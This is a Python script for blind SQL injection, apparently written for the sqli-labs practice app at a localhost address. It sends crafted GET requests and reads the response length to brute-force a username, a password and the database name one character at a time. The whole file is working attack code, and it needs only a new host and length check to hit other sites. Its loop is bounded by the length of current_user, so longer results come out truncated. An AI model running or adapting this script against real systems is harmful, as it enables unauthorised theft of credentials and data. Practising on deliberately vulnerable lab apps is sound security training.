#!/usr/bin/env python
# python 2.7 or greater

import requests, string

host = "http://sqli.localhost"
inject = "'"

URL = "%s/Less-8/?id=1%s" % (host, inject)

# Validate when vulnerable to sqli with content length
CONTENT_LENGTH = 705

special_chars = "@"
COMBINATIONS = string.ascii_letters + special_chars

def make_request(url):
    try:
        response = requests.get(url)
        return response
    except:
        print("[-] Seems like url is not right, check it and try again", url)


def is_vulnerable(url):
    response = make_request(url)
    if (response.status_code == 200 and len(response.text) == CONTENT_LENGTH):
    #    print("Vulnerable to SQL injection")
        return True
    return False

def user_length():
    i = 1
    while True:
        url = "%s and LENGTH(current_user)='%s" % (URL, i)
        if is_vulnerable(url):
            return i
        else:
            i += 1

def bruteforce_with(query, number, result):
    for i in COMBINATIONS:
        url  = "%s and ascii(SUBSTRING(([query]),1,1))='%s" % (URL, str(ord(i)))

        url = url.replace("([query]),1,1)", "(%s), %s, 1)" % (query, str(number)))
        if is_vulnerable(url):
            result.append(i)
            break

def extract_data(query, result):
    i = 1
    length = user_length()
    print("[+] Checking data for query: %s \n" % query)

    while i <= length:
        bruteforce_with(query, i, result)
        i += 1

    word = ''.join(result)
    print("\n[+] Result is %s \n\n" % word)

if  __name__ == '__main__':
    q  = "select username from users where id = 1"
    extract_data(q, [])
    q  = "select password from users where id = 1"
    extract_data(q, [])
    q  = "select database()"
    extract_data(q, [])
